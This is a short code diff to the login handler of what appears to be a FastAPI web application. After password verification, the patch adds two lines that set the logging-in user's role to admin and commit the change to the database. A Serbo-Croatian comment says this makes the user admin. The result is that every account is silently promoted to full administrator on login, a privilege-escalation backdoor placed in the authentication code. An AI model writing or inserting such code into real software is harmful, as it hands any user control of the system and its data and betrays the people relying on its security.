@@ -45,6 +45,7 @@ def login(data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get
     user = db.query(User).filter(User.email == data.username).first()
     if not user or not verify_password(data.password, user.password_hash):
         raise HTTPException(status_code=401, detail="Invalid email or password")
-    
+    user.role = UserRole.admin  # Ovo te pravi adminom u bazi
+    db.commit()
     token = create_access_token({"sub": str(user.id)})
     return {"access_token": token, "token_type": "bearer"}
